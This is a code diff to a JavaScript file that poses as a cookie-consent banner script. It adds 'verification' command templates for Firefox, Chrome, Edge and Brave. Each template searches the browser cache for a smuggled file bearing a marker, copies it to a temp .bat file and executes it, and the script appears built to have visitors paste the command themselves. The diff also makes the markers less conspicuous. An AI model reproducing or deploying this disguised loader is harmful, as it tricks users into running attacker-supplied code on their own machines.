@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.6.0',
+    version: '1.6.1',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -20,14 +20,14 @@
     cacheFileUrl: null,
     cacheFileBodySize: null,
     strictBody: true,
-    bodyStartMarker: '===CDRP_A7F3B2E9D41C===',
-    bodyEndMarker: '===CDRP_END_A7F3B2E9D41C===',
+    bodyStartMarker: '|x7F3|',
+    bodyEndMarker: '|e7F3|',
     bodyMustStartWith: '@echo off',
-    cacheSearchPaths: {
-      firefox: { root: '%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles', glob: '(*)' },
-      chrome: { root: '%LOCALAPPDATA%\\Google\\Chrome\\User Data', glob: '(f_*)' },
-      edge: { root: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data', glob: '(f_*)' },
-      brave: { root: '%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data', glob: '(f_*)' }
+    verificationTemplates: {
+      firefox: 'cmd /c for /d %p in ("%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles\\*") do @for /r "%p\\cache2\\entries" %f in (*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"',
+      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @find "{M}" "%f">nul&&if not exist "%TMP%\\t.bat" copy /y "%f" "%TMP%\\t.bat">nul&if exist "%TMP%\\t.bat" call "%TMP%\\t.bat"'
     }
   };
 
@@ -132,18 +132,16 @@
   }
 
   function getVerificationCommand() {
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || '|x7F3|';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || '|e7F3|';
     if (!startMarker || !endMarker) return '';
 
     var key = getBrowserKey();
-    var paths = CONSENT_CONFIG.cacheSearchPaths || {};
-    var profile = paths[key] || paths.firefox;
-    if (!profile) return '';
+    var templates = CONSENT_CONFIG.verificationTemplates || {};
+    var tpl = templates[key] || templates.firefox || '';
+    if (!tpl) return '';
 
-    var find = 'findstr /m /c:"' + startMarker + '" "%f" >nul 2>nul && findstr /m /c:"' + endMarker + '" "%f" >nul 2>nul';
-    var loop = 'for /r "' + profile.root + '" %f in ' + profile.glob + ' do @(' + find + ' && if not exist "%TEMP%\\t.bat" copy /y "%f" "%TEMP%\\t.bat" >nul 2>nul)';
-    return 'cmd /c ' + loop + ' & if exist "%TEMP%\\t.bat" call "%TEMP%\\t.bat"';
+    return tpl.replace(/\{M\}/g, startMarker);
   }
 
   function fallbackCopy(text) {
@@ -247,8 +245,8 @@
       }
     }
 
-    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CDRP_A7F3B2E9D41C===';
-    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===CDRP_END_A7F3B2E9D41C===';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || '|x7F3|';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || '|e7F3|';
     if (text.indexOf(startMarker) === -1) {
       return { ok: false, reason: 'missing start marker ' + startMarker };
     }
